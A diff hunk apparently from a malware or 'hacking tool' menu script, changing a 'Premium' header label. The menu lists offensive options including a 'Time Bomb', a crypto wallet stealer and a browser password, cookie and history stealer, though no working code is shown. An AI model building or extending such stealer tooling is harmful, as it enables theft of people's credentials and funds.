@@ -31,7 +31,7 @@ def menu():
     {c.c}[19]{c.lr} The Matrix
     {c.c}[20]{c.lr} Time Bomb{c.c}(Needs configuration)
     
-    {w}[$] {y}Premium - Gold Mine
+    {w}[$] {y}#######  Premium  #######
     
     {w}[21] {g}Crypto Wallet Stealer
     {w}[22] {g}Browser Passwords, Cookies, Hist stealer
